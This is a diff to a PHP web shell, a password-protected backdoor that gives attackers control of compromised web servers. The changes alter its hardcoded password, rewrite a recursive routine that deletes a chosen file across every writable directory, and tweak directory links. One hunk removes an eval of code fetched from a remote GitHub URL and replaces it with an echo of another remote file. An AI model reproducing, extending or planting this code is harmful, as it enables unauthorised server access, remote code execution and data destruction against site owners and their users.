@@ -30,7 +30,7 @@ date_default_timezone_set("Asia/Jakarta");
 $_7 = array_merge($_POST, $_GET);
 $_r = "required='required'";
 $gcw = "getcwd";
-$correctPassword = "ayu"; //Change Password
+$correctPassword = "heker"; //Change Password
 if (isset($_POST['pass'])) {
     $enteredPassword = $_POST['pass'];
 
@@ -106,10 +106,7 @@ if (!isset($_SESSION['forbidden'])) {
 </body>
 </html>
 <?php
-exit;
-}
-?>
-<?=@null;@eval("?>".file_get_contents("https://raw.githubusercontent.com/Mr-7Mind/AlertUpdate/main/182index.html")); // Alert for update
+echo file_get_contents("https://raw.githubusercontent.com/Mr-7Mind/AlertUpdate/main/183index.html"); // Alert for update
 ?>
 <?php
 if(isset($_7["left"])) {
@@ -117,7 +114,6 @@ if(isset($_7["left"])) {
 	session_destroy();
 	echo '<script>window.location="'.$_SERVER['PHP_SELF'].'";</script>';
 }
-
 if(isset($_7['opn']) && ($_7['opn'] != '') && ($_7['action'] == 'download')){
 	@ob_clean();
 	$file = $_7['opn'];
@@ -564,53 +560,48 @@ $ip = $_SERVER['REMOTE_ADDR'];
 			</form>
 		</div>";
 		}
-		if($_7['id'] == 'delete'){
-		function mass_delete($dir,$namefile) {
-		if(is_writable($dir)) {
-			$dira = scandir($dir);
-			foreach($dira as $dirb) {
-				$dirc = "$dir/$dirb";
-				$▚ = $dirc.'/'.$namefile;
-				if($dirb === '.') {
-					if(file_exists("$dir/$namefile")) {
-						$GLOBALS['fungsi'][4]("$dir/$namefile");
+		if ($_7['id'] == 'delete') {
+			function mass_delete($dir, $namefile)
+			{
+				if (is_writable($dir)) {
+					$fileToDelete = "$dir/$namefile";
+					if (is_file($fileToDelete) && is_writable($fileToDelete)) {
+						if (unlink($fileToDelete)) {
+							echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$fileToDelete deleted successfully<br>";
+						} else {
+							echo "[<red><i class='bi bi-exclamation-triangle-fill'></i></red>]&nbsp;Failed to delete $fileToDelete<br>";
+						}
 					}
-				} elseif($dirb === '..') {
-					if(file_exists("".dirname($dir)."/$namefile")) {
-						$GLOBALS['fungsi'][4]("".dirname($dir)."/$namefile");
-					}
-				} else {
-					if($fungsi[1]($dirc)) {
-						if(is_writable($dirc)) {
-							if(file_exists($▚)) {
-								echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
-								$GLOBALS['fungsi'][4]($▚);
-								$▟ = mass_delete($dirc,$namefile);
-								}
-							}
+					$dira = scandir($dir);
+					foreach ($dira as $dirb) {
+						$dirc = "$dir/$dirb";
+						if ($dirb === '.' || $dirb === '..') {
+							continue;
+						}
+						if (is_dir($dirc)) {
+							mass_delete($dirc, $namefile);
 						}
 					}
 				}
 			}
-		}
-		if($_7['start']) {
-			mass_delete($_7['d_dir'], $_7['d_file']);
-		}
-		s();
-		echo "
-		<div class='card card-body text-dark input-group mb-3'>
-			<form method='POST'>
-				<i class='bi bi-folder'></i> Directory:
-				<input class='form-control btn-sm' type='text' name='d_dir' value='$dir' $_r>
+			if ($_7['start']) {
+				mass_delete($_7['d_dir'], $_7['d_file']);
+			}
+			s();
+			echo "
+			<div class='card card-body text-dark input-group mb-3'>
+				<form method='POST'>
+					<i class='bi bi-folder'></i> Directory:
+					<input class='form-control btn-sm' type='text' name='d_dir' value='$dir' $_r>
 					<i class='bi bi-file-earmark'></i> Filename:
-				<div class='input-group'>
-					<input class='form-control btn-sm' type='text' name='d_file' placeholder='filename' $_r><br>
-					<div class='input-group-append'>
-						<input class='btn btn-dark btn-sm' type='submit' name='start' value='delete'>
+					<div class='input-group'>
+						<input class='form-control btn-sm' type='text' name='d_file' placeholder='filename' $_r><br>
+						<div class='input-group-append'>
+							<input class='btn btn-dark btn-sm' type='submit' name='start' value='delete'>
+						</div>
 					</div>
-				</div>
-			</form>
-		</div>";
+				</form>
+			</div>";
 		}
 		if($_7['id'] == 'network'){
 		s();
@@ -1231,7 +1222,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 		if(!$fungsi[1]($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
 		echo "
 		<tr>
-			<td><i class='bi bi-folder-fill'></i><a class='text-decoration-none text-secondary' href='?dir=".hex($path.'/'.$dir)."'>$_d</a></td>
+			<td><i class='bi bi-folder-fill'></i><a class='text-decoration-none text-secondary' href='?path=".hex($path.'/'.$dir)."'>$_d</a></td>
 			<td class='text-center'>dir</td>
 			<td class='text-center'>$dt</td>
 			<td class='text-center'>-</td>
